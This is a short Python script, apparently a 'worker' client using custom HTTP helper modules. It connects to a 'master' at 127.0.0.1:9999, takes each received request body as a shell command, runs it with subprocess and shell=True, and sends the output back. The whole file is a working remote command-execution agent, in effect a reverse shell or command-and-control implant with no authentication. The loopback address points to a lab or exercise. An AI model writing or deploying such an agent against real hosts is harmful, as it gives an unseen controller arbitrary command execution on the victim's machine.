import subprocess
from client_http import Client
from request import Request
from response import Response

worker = Client()
worker.open(("127.0.0.1", 9999))
print("[+] Connected to master")

while True:
    raw = b""
    while True:
        raw += worker.connection.recv(4096)
        if b"\r\n\r\n" in raw:
            header_part, _, body_part = raw.partition(b"\r\n\r\n")
            content_length = None
            for line in header_part.split(b"\r\n")[1:]:
                if line.lower().startswith(b"content-length:"):
                    content_length = int(line.split(b":", 1)[1].strip())
                    break
            if content_length is None or len(body_part) >= content_length:
                break

    cmd = Request.load(raw).body.decode(errors="replace").strip()
    if cmd == "exit":
        break

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
    output = (result.stdout + result.stderr).encode()
    response = Response(
        status=200 if result.returncode == 0 else 500,
        message="OK" if result.returncode == 0 else "Error",
        headers={"Content-Length": [str(len(output))]},
        body=output,
    )
    worker.connection.sendall(response.dump())

worker.connection.close()